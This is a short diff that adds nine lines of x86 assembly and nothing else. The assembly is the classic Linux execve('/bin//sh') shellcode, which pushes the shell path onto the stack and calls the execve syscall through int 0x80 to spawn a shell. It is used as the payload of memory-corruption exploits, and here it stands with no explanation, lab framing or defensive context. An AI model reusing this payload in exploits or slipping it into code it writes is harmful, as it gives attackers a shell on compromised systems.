@@ -1,0 +1,9 @@
+XOR eax, eax
+PUSH eax
+PUSH 0x68732f2f
+PUSH 0x6e69622f
+ADD eax, 0x0b
+MOV ebx, esp
+PUSH ebx
+MOV ecx, esp
+INT 0x80
